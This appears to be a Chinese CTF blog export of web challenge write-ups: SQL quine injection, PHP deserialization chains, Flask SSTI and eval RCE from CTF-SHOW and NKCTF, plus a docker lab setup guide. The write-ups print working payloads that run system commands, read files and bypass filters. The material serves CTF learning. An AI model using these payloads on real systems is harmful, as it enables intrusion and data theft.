`.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596804773-43900a23-f1bb-4f21-bd92-1258a4af3700.png)\n\n如果输入  `replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")') ` \n\n则会用第三个参数去替换第一个参数中的所有`.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596879463-3e74e07c-7f75-48f1-92e4-69d21e9d6a21.png)\n\n但是此时就会发现一个问题 我们输入与输出并不是完全相同的\n\n我们输入的单引号在输出语句里都是双引号\n\n因此 需要在repalce里面再嵌套一个replace来让双引号转成单引号  \n\n```\nreplace(replace(\".\",char(34),char(39)),char(46),\".\")\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597458239-a1bc5eba-19bd-4464-afe0-f5582b6f9c02.png)\n\n用上面的式子替换所有的`.`\n\n```\nreplace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")')\n```\n\n就会发现输入与输出完全相等\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597557792-2a8afbc9-a8a2-4de8-a340-a3415d2e2d08.png)\n\n 回到题目 因为屏蔽了空格用`()`嵌套或者`/**/`绕过都行\n\npayload:`1'UNION(SELECT(REPLACE(REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39)),CHAR(37),'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#')))#`\n\n分析：\n\n`1'UNION(SELECT(REPLACE(A,CHAR(37),B)))`  用B替换%,%这个符号应该是任意的后续替换时变成相应的char就行\n\n`A:REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39))`  双引号换为单引号->替换%->双引号换为单引号\n\n```\nB:'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#'\n```\n\n双引号换位单引号->替换%\n\n提供三种payload吧，以后如果再遇到这样的题目也能拿来直接用\n\n1. `1'/**/union/**/select/**/replace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#`\n2. `1'union/**/select/**/replace(replace('1\"union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#`\n3. `1'UNION(SELECT(REPLACE(REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39)),CHAR(37),'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#')))#`\n\n第一个payload与第二个payload之间的差距：为第一个与union之间有空格，第二个无，本质上两个payload无区别\n\n注意sql中为char()而不是chr() 网上payload需要转换\n\n搞定：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682598202760-5e0a4fac-7660-4486-bee9-9ef75f6b6530.png)\n\n至于时间盲注这个坑，以后遇到经典题型借助题目来总结吧，这里插个眼先:)\n\n还有两道java题目就不复现了，java还是我没有解锁的领域，复现起来也很吃力，之后系统开始学java之后再来复现填坑吧。\n\n# 小尾巴\n\n这次打完省赛（校赛bushi）虽然很水，但是成功爬进了学校的实验室，也算是一段时间的努力总算有了成果吧，进了实验室才是刚刚开始，自身还是有很多不足，需要继续努力，继续奋斗，干巴得！\n","tags":["Smarty模板注入","js","Yaml反序列化","shell反弹","quine注入","python3解析特性"],"categories":["各赛事WP"]},{"title":"CTF-SHOW 2023愚人杯 WEB部分WP","url":"/post/186d5605.html","content":"\nCTF-SHOW 2023愚人杯 WEB部分WP\n\n<!--more-->\n\n# Challenge_1 easy_signin\n\n这道题像是buuctf一个题目的套皮，查看源码和url，图片内容是以base64编码输出的，并且请求文件名称也是通过base64编码，直接查看index.php的内容，先编码一下index.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677699456-4fddbbeb-4ad5-4059-9bd5-e8707545697e.png)\n\npayload：`?img=aW5kZXgucGhw`\n\n拿到base64加密后的内容\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677766484-107ac894-6af0-47d9-babb-dbc944ecdae2.png)\n\n再去解密一下，拿到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677805971-9deab45d-79af-4408-9836-64167015721e.png)\n\n# Challenge_2 被遗忘的反序列化\n\n\n\n这道题目没做出来，一开始就卡住了，他提示当前目录有个txt文件，那么就应该先去读这个文件获取相应的提示，不会啊，看了wp，发现用了php原生类读的，真的太强了\n\n然后这道题预期解真的太麻烦了，还要涉及密码偏移问题，而且还要脚本爆破，非预期真的很简单\n\n```php\n<?php\n\n# 当前目录中有一个txt文件哦\nerror_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this->text == \"aaaa\"){\n            echo lcfirst($this->text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -> aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -> a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -> key)){\n            $this->key = file_get_contents($this -> file);\n        }else{\n            echo \"不行哦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this->aaa;\n    }\n\n    public function __invoke(){\n        $this -> aaa = clone new EeE;\n    }\n}\n\n$_ip = $_SERVER[\"HTTP_AAAAAA\"];\nunserialize($_ip);\n```\n\n直接来看这里：\n\n```php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n}   \n```\n\n`$a = new $this->coos($this->file);` 这一行 看到这里我们是不是可以构造一个可变函数 形如：$a($b)的形式达到getshell的操作 但是这里有个new 将类实例化 也就意为着不能通过这样来构造可变函数\n\n那么这里就用到了php的原生类，具体看这篇文章：https://blog.csdn.net/cjdgg/article/details/115314651\n\n可遍历目录的原生类：\n\nDirectoryIterator 类\nFilesystemIterator 类\n\nGlobIterator 类  \n\n使用 DirectoryIterator 类\nDirectoryIterator配合glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。 \n\n比如以这样的`/f*`形式模糊操作来获得flag的文件名\n\n比如我win电脑上d盘根目录下存在一个blog文件,我就可以利用原生类再配合glob协议获取到该文件的具体文件名\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680679507460-93022bf0-b786-497a-ae92-c77e7bcaad71.png)\n\n回到题目：本地构造\n\n```php\n<?php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n}   \n\n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n}\n\n\n$w=new w_wuw_w();\n$w->aaa=new gBoBg(); //通过类W_WUW_W中的析构函数来调用类gBoBg中的__toString魔术方法\n$w->aaa->name=\"1\";\n$w->aaa->file=\"glob:///f*\";\n$w->aaa->coos=\"DirectoryIterator\";\necho urlencode(serialize($w));\n?>\n```\n\n然后这里传参是通过请求包中AAAAAA来传参的蛮新颖的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680020351-96a2b7d8-9c2b-4bae-a866-bdb03409e953.png)\n\n然后再通过读文件原生类来读flag\n\nSplFileObject\n\n本地构造：\n\n```php\n<?php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n}   \n\n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n}\n\n\n$w=new w_wuw_w();\n$w->aaa=new gBoBg(); //通过类W_WUW_W中的析构函数来调用类gBoBg中的__toString魔术方法\n$w->aaa->name=\"1\";\n$w->aaa->file=\"/f1agaaa\";\n$w->aaa->coos=\"SplFileObject\";\necho serialize($w);\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680133216-6324145c-b089-45c1-b238-7e7d2e81a43b.png)\n\n# Challenge_3 easy_ssti\n\n这道题还是蛮简单的 根据题目是一个模板注入的题目\n\n查看源码 下载一个压缩包\n\n```php\nfrom flask import Flask\nfrom flask import render_template_string,render_template\napp = Flask(__name__)\n\n@app.route('/hello/')\ndef hello(name=None):\n    return render_template('hello.html',name=name)\n@app.route('/hello/<name>')\ndef hellodear(name):\n    if \"ge\" in name:\n        return render_template_string('hello %s' % name)\n    elif \"f\" not in name:\n        return render_template_string('hello %s' % name)\n    else:\n        return 'Nonononon'\n```\n\n一眼顶针，flask的模板注入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680541981-d158f0ea-eb91-455f-96f7-e07327426721.png)\n\n然后网上payoad太多了（https://blog.csdn.net/qq_46918279/article/details/121270806）\n\n这里主要过滤了斜杠，可以用`${HOME:0:1}`绕过\n\npayload: \n\n`{{get_flashed_messages.__globals__['os'].popen('whoami').read()}}`\n\n`{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat ${HOME:0:1}[e-g]lag').read()}}` \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680569196-d457fb09-796e-4298-a9cc-6d686b500d42.png)\n\n# challenge_4 easy_flask\n\n这道题目快做出来了，最后一步没有去读取当前目录下的app.py的文件去看源码，真给自己无语住了，脑子被大便灌了一样\n\n回到题目：\n\n看标题还是关于flask模板的漏洞\n\n申请一个账号进去\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681197676-57ac85a1-3064-41a1-83d0-732cb4a05b0d.png)\n\n最后一句话他说只会给admin给一些东西，那么目标就很明确了，flask模板常见的session伪造，找一个脚本伪造就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681282376-730ae4d5-a1ae-4d8f-a582-40b6713c5101.png)\n\n之后给到一个假的flag 然后注意到他请求方式\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681334740-bdbc1132-befd-4deb-b14f-7f1c618c8af1.png)\n\n他现在给的源代码只是一部分，我们应该通过读app.py来获取完整的源代码\n\n```php\n# app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}\n}\n\n\n\n@app.route('/')\ndef index():\n    # Check if user is loggedin\n    if 'loggedin' in session:\n        return redirect(url_for('profile'))\n    return redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users and password == users[username]['password']:\n            session['loggedin'] = True\n            session['username'] = username\n            session['role'] = users[username]['role']\n            return redirect(url_for('profile'))\n        else:\n            msg = 'Incorrect username/password!'\n    return render_template('login2.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\n    msg = '' \n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users:\n            msg = 'Account already exists!'\n        else:\n            users[username] = {'password': password, 'role': 'user'}\n            msg = 'You have successfully registered!'\n    return render_template('register2.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\n    if 'loggedin' in session:\n        return render_template('profile2.html', username=session['username'], role=session['role'])\n    return redirect(url_for('login'))\n\n\n@app.route('/show/')\ndef show():\n    if 'loggedin' in session:\n        return render_template('show2.html')\n\n@app.route('/download/')\ndef download():\n    if 'loggedin' in session:\n        filename = request.args.get('filename')\n        if 'filename' in request.args:              \n            return send_file(filename, as_attachment=True)\n  \n    return redirect(url_for('login'))\n\n\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n    \n\n\n@app.route('/logout/')\ndef logout():\n   session.pop('loggedin', None)\n   session.pop('id', None)\n   session.pop('username', None)\n   session.pop('role', None)\n   return redirect(url_for('login'))\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=8080)\n```\n\n注意到这里 可以进行命令执行 注意是python的命令执行和php的形式稍有不同\n\n```php\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n/hello/?eval=__import__('os').popen('ls /').read()\n/hello/?eval=__import__('os').popen('cat /flag_is_h3re').read()\n```\n\n稍微解释一下 还是不太熟悉python的命令执行 是通过调用模块的方式\n\n**__import__()** 函数用于动态加载类和函数  \n\n**os** --- 操作系统接口模块\n\n**os.popen()** 方法用于从一个命令打开一个管道。  \n\n**read()** 方法用于从文件读取指定的字节数，如果未给定或为负则读取所有。  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681711491-461b37da-6ce3-4b0d-9b1b-f5be01576642.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681726881-b115297a-f1d5-4d07-9666-f4f38e5cf138.png)\n\n# Challenge_5 easy_php\n\n源码：\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        system($this->ctfshow);\n    }\n\n}\n\n$data = $_GET['1+1>2'];\n\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n\n\n?>\n```\n\n这道题不会做，看了wp还是蛮神奇的，简单分析一下\n\n应该是通过反序列化去执行ctfshow类中的`system()`函数\n\n这里首先解除一下我固有的想法，我们都知道，当反序列化时首先会执行__wakeup魔术方法，这道题执行后会用到die()函数，程序运行完了，我原以为要通过增加对象属性方法去绕过__wakeup函数，但是发现没必要，因为析构函数不会受到影响。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680682560289-777732f6-fecf-4574-9c71-9b1cac882a4b.png)\n\n所以没必要去绕过\n\n那么这道题目最主要的就是去绕过这个正则匹配\n\n```php\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n```\n\n我们传参不能以O或者a开头\n\n我们都知道序列化后的字符串首字母就为O 意为object对象的意思\n\n那么这里应该怎么绕过呢\n\n这里考到了 PHP7.3 __wakeup绕过，ArrayObject内置类 并且这个类可以起到类似于反序列化我们传入的序列化对象，当然这里说的不严谨，但可以这样理解参考：https://juejin.cn/post/7105704360155283469 \n\n注意这里只能在php7.3版本下才能成功，一开始复现的时候没注意到\n\n ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680683801763-77de8014-f72c-4c36-8e8e-b8016b18d2c3.png)\n\nc打头\n\n那么问题来了，为什么要ban a字符呢ban了o字符不久行了嘛\n\n如果不ban a 我们可以直接序列化数组去包含我们的恶意代码从而达到getshell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684039061-77ce25bf-492d-4fea-ab53-dc14a69e04c2.png)\n\n明白之后，本地构造\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684422756-3957d554-5eb3-4b5a-b998-426f46960407.png)\n\n这里传参的时候记得把1+1>2 url编码一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684325551-252a9b8d-ed0a-4898-9ddb-f3983e2a9f6e.png)\n\n之后就是读取了。\n\n# 后记：\n\n这次最主要学到了php原生类的知识点把，tql！！！！\n\n","tags":["php原生类","flask session伪造","ssti"],"categories":["ctfshow"]},{"title":"记一次简单的docker开设web靶场","url":"/post/5400d97d.html","content":"\n记录一次简单的docker开设web靶场\n\n<!--more-->\n\n# 前期准备：\n\n一台云服务器(这里用到了舍友的服务器==)\n\ndocker环境\n\n# 正文：\n\n首先自我认识什么是docker，docker就像是一个装水的杯子，在这里把里面的水叫做镜像，我们需要先下载好镜像，当运行镜像时，docker会先在本地寻找所要打开的镜像，如果找不到就会自动从docker镜像仓库下载。\n\n这里我已经提前配置好了docker环境 上网一搜有很多安装教程\n\n`docker version`查看版本信息\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680239557401-3f605a8c-793d-4257-a9f8-8db90a07ff2f.png)\n\n`docker search lamp` 查找lamp堆栈镜像\n\nLAMP 堆栈是开发人员用来构建网站和 Web 应用程序的四种不同软件技术的捆绑包。\n\nLAMP 是操作系统 Linux、Web 服务器 Apache、数据库服务器 MySQL 和编程语言 PHP 的首字母缩写  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244378603-6e7e24e9-493e-4cb9-8dcd-89dcc1780d88.png)\n\n`docker pull  tutum/lamp`  下载tutum/lamp版本的 \n\n`docker iamges` 下载好之后查看本地镜像\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244467495-06625797-38d0-4cbc-b25c-96cc941260bf.png)\n\n将镜像实例化 需要分配服务器的端口 这里要在服务器管理页面给开放一个端口（比如阿里云或者腾讯云的控制台）\n\n` docker run -d -p 9999:80 tutum/lamp  `这里我分配的是9999端口\n\n`docker ps`查看当前运行的容器，看到了我们刚刚启动的容器\n\n`docker ps -a`是查看所有的容器，包括当前不运行的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245286556-0ba73951-dc0a-4cfb-84ff-670601a7ca8c.png)\n\n这里注意一下，区分镜像和容器的区别，一个镜像可以开很多个容器，用容器id来区分相同镜像实例化产生不同的容器，这里还是要注意记录一下自己在用的容器id，以免误删了，整个容器中的你已经弄好的文件都会被删除。\n\n`docker exec -it 1c0d6146aa65 bash` 进入我们刚刚实例化好的容器里面\n\n`exit`退出当前所在的容器\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245570215-8d68ad83-e2c9-4028-b1a2-b17b84d337d0.png)\n\n接下来就是在/var/www/html文件下的index.php下提交web题目的源码，然后在根目录下创建flag的文件，一个简单的web靶场复现环境就创建好了，接下来就可以愉快的复现题目了！\n\n这里我放了一个测试php代码和根目录下的flag文件：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246463698-c3ceb1ae-e186-4943-a0af-ad5173eba16a.png)\n\n还有就是这个lamp开的容器内是没有vim编辑环境的，如果直接想在容器内写代码的话，可以在容器内安装vim编辑器。\n\n浏览器访问：`124.221.177.174:9999`\n\n成功一个简单的web靶场就搭建好了！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246392826-a865a0c6-42cc-4105-bcc0-b5dd202c356e.png)\n\n如果想关闭容器，注意这里不是删除镜像文件，只是关闭这个镜像实例化的一个容器。\n\n`docker stop 容器id`关闭容器\n\n`docker start 容器id`打开容器\n\n`docker rm 容器id` 删除容器 \n\n# 结尾：\n\n这里步骤截图放的图片暴露了服务器的外网ip和一些其他信息，大佬不要渗透我啊，这里只是一个热爱ctf的小菜鸡的一次记录罢了，在线求饶QWQ\n","tags":["搭建","docker"],"categories":["搭建"]},{"title":"NKCTF 2023 WEB WP","url":"/post/8bc42760.html","content":"\nNKCTF 2023 部分WEB WP\n\n<!--more-->\n\n# 前言\n\n这次第一次组队，与舍友一位pwn选手(攻克三道)，打还是蛮不错的一次体验，虽然排名没有多靠前吧，坐牢两天终于啃下两道web题目，听说其他都是1day，还是大佬的比赛啊，我这种菜狗就啃啃签到题目，但收获还是很多啊。\n\n最后只攻克了三道，也写写wp吧，也算是给自己记录一下。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679928004403-8a6fdc30-ca46-4faf-bb59-ba788d93bf12.png)\n\n# baby_php\n\n放出源码：\n\n```plain\n<?php\n    error_reporting(0);\n    class Welcome{\n        public $name;\n        public $arg = 'oww!man!!';\n        public function __construct(){\n            $this->name = 'ItS SO CREAZY';\n        }\n        public function __destruct(){\n            if($this->name == 'welcome_to_NKCTF'){\n                echo $this->arg;\n            }\n        }\n    }\n\n    function waf($string){\n        if(preg_match('/f|l|a|g|\\*|\\?/i', $string)){\n            die(\"you are bad\");\n        }\n    }\n    class Happy{\n        public $shell;\n        public $cmd;\n        public function __invoke(){\n            $shell = $this->shell;\n            $cmd = $this->cmd;\n            waf($cmd);\n            eval($shell($cmd));\n        }\n    }\n    class Hell0{\n        public $func;\n        public function __toString(){\n            $function = $this->func;\n            $function();\n        }\n    }\n\n    if(isset($_GET['p'])){\n        unserialize($_GET['p']);\n    }else{\n        highlight_file(__FILE__);\n    }\n?>\n```\n\n一道经典的反序列化pop链rce题目，就是我卡在最后怎么绕waf很久，我太菜了。\n\npop链构造很简单，主要说说waf的绕过把\n\nwaf分别禁了f l a g 字符这就导致很多linux命令都不能用了 比如ls cat tac less tail \n\n然后还禁了通配符`?` 和`*`防止我们通过这样模糊操作去getshell  \n\nls 可以通过 dir来绕过  读文件用more来绕过\n\n然后读flag就是很头疼的事情了，这里就是因为他禁了通配符给了我启发\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679891817693-acfb04f2-5a0e-4435-97f9-fdba062697b5.png)\n\n参考：https://abcfy2.gitbooks.io/linux_basic/content/first_sense_for_linux/command_learning/wildcard.html\n\n还有一种通配符是`[]`可以匹配指定范围中的任意字符 那么 f和g就可以用`[e-h]`来绕过\n\na是字母表第一个，该怎么绕过呢，我们可以构造`[非数字]`形式:`[^0-9]` 这里尖括号就是排除匹配范围，这也就可以包含所有字母 来达到获取a的效果了\n\n本地构造：\n\n```plain\n<?php\n    error_reporting(0);\n    class Welcome{\n        public $name;\n        public $arg = 'oww!man!!';\n        public function __construct(){\n            $this->name = 'welcome_to_NKCTF';\n        }\n    }\n\n    class Happy{\n        public $shell;\n        public $cmd;\n    }\n    class Hell0{\n        public $func;\n    }\n$a=new Welcome();\n$a->arg = new Hell0();\n$a->arg->func = new Happy();\n$a->arg->func->shell='system';    \n$a->arg->func->cmd=\"more  /[e-h]1[^0-9][e-h]\";\necho urlencode(serialize($a));\n?>\n```\n\n记得最后payload url编码一下 反序列化题目的常用套路了\n\n```\np=O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22cmd%22%3Bs%3A24%3A%22more++%2F%5Be-h%5D1%5B%5E0-9%5D%5Be-h%5D%22%3B%7D%7D%7D\n```\n\n拿到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679892001266-d44e146e-ab39-40b0-98f5-4f46ab72ee96.png)\n\n# esay_php\n\n放出源码：\n\n```plain\n<?php \n    highlight_file(__FILE__);\n    error_reporting(0);\n    if($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])){\n        if((string)$_POST['c'] != (string)$_POST['d'] && sha1($_POST['c']) === sha1($_POST['d'])){\n            if($_GET['e'] != 114514 && intval($_GET['e']) == 114514){\n                if(isset($_GET['NS_CTF.go'])){\n                    if(isset($_POST['cmd'])){\n                        if(!preg_match('/[0-9a-zA-Z]/i', $_POST['cmd'])){\n                            eval($_POST['cmd']);\n                        }else{\n                            die('error!!!!!!');\n                        }\n                    }else{\n                        die('error!!!!!');\n                    }\n                }else{\n                    die('error!!!!');\n                }\n            }else{\n                die('error!!!');\n            }\n        }else{\n            die('error!!');\n        }\n    }else{\n        die('error!');\n    }\n?>\n```\n\n这是一道md5弱相等，sha1碰撞，php字符串解析特性这里是考php命名规则合法与否，还有就是无数字字母rce。\n\n## sha1碰撞\n\n来看sha1碰撞：\n\n之前有做过md5强相等的题目，因为被string强转化了，所以一些常见的数组绕过就不能用了，只能老实用脚本碰撞，sha1和md5做法很相似。\n\nsha1 — 计算字符串的 sha1 散列值\n\n在这里先说一说md5强类型字符串转换后碰撞相等吧\n\n这里有专门md5碰撞的脚本：https://blog.csdn.net/shuaicenglou3032/article/details/118197904 \n\n本地测试\n\n先拿到散列值：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926136860-9c662264-fd6e-411f-9074-2a2201872239.png)\n\n本地写一个测试demo\n\n源码：\n\n```php\n<?php \nshow_source('index.php');\n$a=$_GET['a'];\n$b=$_GET['b'];\nif((string)$a != (string)$b && md5($a) === md5($b)){\n    echo \"yes\";\n}\nelse{\n    echo \"no\";\n}\n?>\n```\n\n这里测试最好在低版本php下测试不然高版本已经被修复了 我这里version是5.3.29\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926309291-918ee00d-2b44-43fc-8424-04f9c2d48c25.png)\n\n测试是可以通过脚本碰撞\n\n再来看sha1()\n\n这里没有找到关于sha1的碰撞脚本，但是找到了两个符合条件的值，之后再遇到拿来用就行。\n\na=`%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1`\n\nb=`%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926782885-7cec8231-cd06-4dc8-b096-96e3b49887a7.png)\n\n## 